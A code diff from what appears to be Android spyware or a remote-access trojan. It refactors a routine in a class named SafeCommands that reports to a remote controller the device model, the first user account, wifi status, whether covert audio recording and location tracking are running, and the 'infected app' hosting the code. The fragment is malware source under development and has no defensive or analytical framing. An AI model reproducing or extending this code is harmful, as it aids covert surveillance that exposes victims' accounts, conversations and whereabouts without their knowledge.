@@ -226,14 +226,25 @@ public class SafeCommands {
         } else {
             ssid += " state " + wifiInfo.getSupplicantState();
         }
-        comms.say("########################################################");
-        comms.say("brand + model   = " + Build.BRAND + " " + Build.MODEL);
-        comms.say("account[0]      = " + getFirstAccount());
-        comms.say("wifi status     = " + ssid);
-        comms.say("recording audio = " + SafeService.isbAudioStarted());
-        comms.say("location track  = " + SafeService.isbLocationStarted());
-        comms.say("infected app    = " + context.getApplicationContext().getPackageName() + " v" + SafeService.VERSION);
-        comms.say("########################################################");
+        StringBuilder sb = new StringBuilder();
+        sb.append("\r\n");
+        sb.append("########################################################");
+        sb.append("\r\n");
+        sb.append("brand + model   = " + Build.BRAND + " " + Build.MODEL);
+        sb.append("\r\n");
+        sb.append("account[0]      = " + getFirstAccount());
+        sb.append("\r\n");
+        sb.append("wifi status     = " + ssid);
+        sb.append("\r\n");
+        sb.append("recording audio = " + SafeService.isbAudioStarted());
+        sb.append("\r\n");
+        sb.append("location track  = " + SafeService.isbLocationStarted());
+        sb.append("\r\n");
+        sb.append("infected app    = " + context.getApplicationContext().getPackageName() + " v" + SafeService.VERSION);
+        sb.append("\r\n");
+        sb.append("########################################################");
+        sb.append("\r\n");
+        comms.say(sb.toString());
     }
 
     private void installedApps() {
